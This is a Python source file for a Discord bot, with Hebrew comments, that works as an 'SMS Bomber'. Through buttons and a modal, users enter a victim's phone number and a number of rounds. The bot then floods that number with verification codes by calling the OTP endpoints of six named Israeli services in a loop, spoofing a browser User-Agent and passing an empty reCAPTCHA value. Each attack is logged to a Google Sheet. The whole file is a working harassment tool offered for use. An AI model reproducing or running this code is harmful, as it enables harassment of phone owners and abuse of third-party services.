import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime

TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL')

# משתנה לשליטה על עצירת התקיפה
active_attacks = {}

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# --- פונקציית הלוג לגיליון שלך ---
def log_to_gsheet(user_tag, user_id, target_phone, rounds, success, failed):
    if not GSHEET_URL: return
    
    now = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
    payload = {
        "timestamp": now,
        "type": "sms-bomb", # הסוג החדש שהוספנו
        "target": target_phone,
        "mod": user_tag,
        "userId": str(user_id),
        "reason": f"הפצצת SMS ({rounds} סיבובים)",
        "description": f"הצלחות: {success} | נכשלו: {failed}",
        "guild": "CyberIL"
    }
    try:
        requests.post(GSHEET_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Error logging to GSheet: {e}")

# --- פונקציות ה-API (מקוצרות ליעילות) ---
def call_api(url, payload, is_json=True):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        if is_json:
            res = requests.post(url, json=payload, headers=headers, timeout=4)
        else:
            res = requests.post(url, data=payload, headers=headers, timeout=4)
        return res.status_code in [200, 201]
    except: return False

async def fire_all(phone):
    tasks = [
        asyncio.to_thread(call_api, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(call_api, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        asyncio.to_thread(call_api, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8, "Grecaptcha": ""}),
        asyncio.to_thread(call_api, "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"restaurant_id": 1, "phone": phone, "testing": False}),
        asyncio.to_thread(call_api, "https://www.castro.com/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": "1"}, False),
        asyncio.to_thread(call_api, "https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-renuar-shop", "phone_number": "+972" + phone[1:], "lang": "he"}, False)
    ]
    results = await asyncio.gather(*tasks)
    return sum(results), len(results) - sum(results)

# --- לוגיקת התקיפה ---
async def run_attack(interaction, phone, rounds):
    user_id = interaction.user.id
    user_tag = interaction.user.name
    active_attacks[user_id] = True
    
    s_total, f_total = 0, 0
    
    for i in range(int(rounds)):
        if not active_attacks.get(user_id): break
        
        s, f = await fire_all(phone)
        s_total += s
        f_total += f
        await asyncio.sleep(2)
    
    # שליחת הלוג בסיום
    log_to_gsheet(user_tag, user_id, phone, rounds, s_total, f_total)
    active_attacks.pop(user_id, None)

# --- ממשק דיסקורד ---
class AttackView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 Launch", style=discord.ButtonStyle.danger)
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        class BombModal(discord.ui.Modal, title="SMS Bomber"):
            p = discord.ui.TextInput(label="Phone", min_length=10, max_length=10)
            r = discord.ui.TextInput(label="Rounds", default="10")
            async def on_submit(self, it: discord.Interaction):
                await it.response.send_message(f"Bombing {self.p.value}...", ephemeral=True)
                asyncio.create_task(run_attack(it, self.p.value, self.r.value))
        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.grey)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("Stopping your attack...", ephemeral=True)

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="⚡ CyberIL SMS Control", color=0x00ff00)
    await interaction.response.send_message(embed=embed, view=AttackView())

bot.run(TOKEN)
